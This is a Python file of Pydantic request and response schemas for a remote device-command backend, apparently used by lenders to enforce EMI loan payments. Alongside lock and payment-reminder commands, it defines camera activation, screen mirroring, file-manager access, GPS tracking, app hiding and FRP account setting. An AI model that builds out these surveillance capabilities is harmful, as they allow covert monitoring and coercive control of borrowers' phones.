from pydantic import BaseModel
from typing import Optional, Dict, Any, List
from datetime import datetime
from uuid import UUID
from app.models.command import CommandType, CommandStatus


class CommandCreate(BaseModel):
    device_id: UUID
    command_type: CommandType
    payload: Optional[Dict[str, Any]] = {}
    reason: Optional[str] = None


class CommandBulk(BaseModel):
    device_ids: List[UUID]
    command_type: CommandType
    payload: Optional[Dict[str, Any]] = {}
    reason: Optional[str] = None


class CommandResponse(BaseModel):
    id: UUID
    device_id: UUID
    command_type: CommandType
    payload: Dict[str, Any]
    status: CommandStatus
    fcm_message_id: Optional[str] = None
    created_at: datetime
    sent_at: Optional[datetime] = None
    delivered_at: Optional[datetime] = None
    executed_at: Optional[datetime] = None
    error_message: Optional[str] = None
    reason: Optional[str] = None

    class Config:
        from_attributes = True


class CommandStatusUpdate(BaseModel):
    status: CommandStatus
    error_message: Optional[str] = None


class CommandAck(BaseModel):
    command_id: UUID
    status: CommandStatus
    executed_at: Optional[datetime] = None
    error_message: Optional[str] = None


class LockCommand(BaseModel):
    device_id: UUID
    message: Optional[str] = "Your device has been locked due to pending EMI payment."
    contact_number: Optional[str] = None
    reason: Optional[str] = None


class UnlockCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class WarningCommand(BaseModel):
    device_id: UUID
    title: str = "EMI Payment Reminder"
    message: str
    due_date: Optional[str] = None
    amount: Optional[str] = None


class HideAppCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class UnhideAppCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class DisableAppCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class EnableAppCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class GPSTrackCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class CameraOnCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None
    camera: Optional[str] = "front"  # "front" or "rear"


class CameraOffCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class UninstallAppCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class SetFRPAccountCommand(BaseModel):
    device_id: UUID
    frp_account: str
    reason: Optional[str] = None


class SendMessageCommand(BaseModel):
    device_id: UUID
    message: str
    reason: Optional[str] = None


class UpdateAppCommand(BaseModel):
    device_id: UUID
    target_version: Optional[int] = None
    force: bool = False
    reason: Optional[str] = None


class StartScreenMirrorCommand(BaseModel):
    device_id: UUID
    quality: Optional[int] = 50  # JPEG quality 1-100
    fps: Optional[int] = 4       # frames per second
    scale: Optional[float] = 0.5 # display scale factor
    reason: Optional[str] = None


class StopScreenMirrorCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class StartFileManagerCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class StopFileManagerCommand(BaseModel):
    device_id: UUID
    reason: Optional[str] = None


class BulkUpdateAppCommand(BaseModel):
    device_ids: List[UUID]
    target_version: Optional[int] = None
    force: bool = False
    reason: Optional[str] = None
